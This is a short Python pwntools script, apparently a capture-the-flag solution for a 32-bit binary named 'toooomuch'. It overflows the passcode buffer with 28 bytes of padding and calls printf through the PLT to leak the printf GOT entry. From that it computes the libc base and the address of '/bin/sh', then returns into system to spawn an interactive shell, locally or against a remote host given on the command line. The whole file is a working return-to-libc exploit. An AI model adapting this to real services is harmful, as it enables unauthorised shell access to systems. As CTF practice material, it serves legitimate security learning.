from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./toooomuch_patched")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
printf_plt = 0x8048470
printf_got = 0x8049bf0
toooomuch = 0x804877e
system_plt = 0x80484c0
padding = b'A' * 28
r.sendlineafter("Give me your passcode: ", padding + p32(printf_plt) + p32(toooomuch) + p32(printf_got))
r.recvuntil(b'You are not allowed here!\n')
leak = u32(r.recv(4))
print("Printf leaked: "+hex(leak))
libc = leak - 0x49590
print("Libc base: "+hex(libc))
bin_sh = libc + 0x15ba3f
r.sendlineafter(b'Give me your passcode:', padding + p32(system_plt) + p32(0xDEADBEEF) + p32(bin_sh))
r.interactive()